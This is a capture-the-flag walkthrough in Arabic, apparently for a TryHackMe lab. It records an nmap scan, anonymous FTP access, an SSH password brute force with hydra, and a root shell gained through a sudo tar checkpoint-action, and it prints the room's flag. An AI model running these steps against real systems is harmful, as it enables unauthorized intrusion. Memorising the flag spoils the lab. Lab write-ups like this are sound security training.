

## 1. Reconnaissance (استكشاف الخدمة النشطة)

### فحص المنافذ باستخدام Nmap:

قمنا بإجراء فحص باستخدام `nmap` للكشف عن المنافذ المفتوحة والخدمات الموجودة على الهدف:

```
nmap -sV 10.10.129.160
```

**النتائج:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

### تحليل النتائج:

- المنفذ `21` مفتوح ويشغل خدمة `vsftpd 3.0.3` (خادم FTP).
- المنفذ `22` يعمل عليه `OpenSSH 7.2p2` (قد يكون وسيلة للدخول لاحقًا).
- المنفذ `80` يعمل عليه `Apache` (قد يحتوي على موقع ويب يمكن استغلاله).

## 2. استغلال FTP (Anonymous Login)

قمنا بمحاولة الدخول إلى خادم FTP باستخدام `anonymous`، حيث نجح تسجيل الدخول.

```
ftp 10.10.8.245
Name (10.10.8.245:yousef): anonymous
230 Login successful.
```

بعد تسجيل الدخول، قمنا بفحص الملفات الموجودة على الخادم:

```
ls
```

**النتيجة:**

```
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

ثم قمنا بتنزيل الملفات لاستخراج أي معلومات مفيدة:

```
get locks.txt
get task.txt
```

## 3. استخراج بيانات تسجيل الدخول

بفحص محتويات `task.txt` وجدنا ملاحظة قد تشير إلى استخدام كلمات مرور محددة. ثم استخدمنا `locks.txt` كمصدر لكلمات المرور لمحاولة الدخول عبر SSH.

## 4. الدخول عبر SSH

قمنا باستخدام `hydra` لتجربة تسجيل الدخول عبر SSH باستخدام اسم المستخدم `lin` وقاموس كلمات المرور المستخرج من `locks.txt`:

```
hydra -l lin -P locks.txt ssh://10.10.129.160
```

**تم العثور على كلمة المرور!** ثم قمنا بتسجيل الدخول:

```
ssh lin@10.10.129.160
```

## 5. تصعيد الصلاحيات (Privilege Escalation)

بعد تسجيل الدخول، قمنا بفحص الأوامر التي يمكن تشغيلها بصلاحيات `sudo`:

```
sudo -l
```

وجدنا إمكانية تشغيل `tar` بصلاحيات `sudo`، مما يمكننا من استغلال `checkpoint-action` للحصول على `root`:

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

**الآن نحن `root`!**

## 6. استخراج العلم (Root Flag)

بما أننا حصلنا على صلاحيات `root`، انتقلنا إلى مجلد `/root` للحصول على العلم:

```
cd /root
ls
cat root.txt
```

**العلم:**

```
THM{80UN7Y_h4cK3r}
```


![[Pasted image 20250323230136.png]]
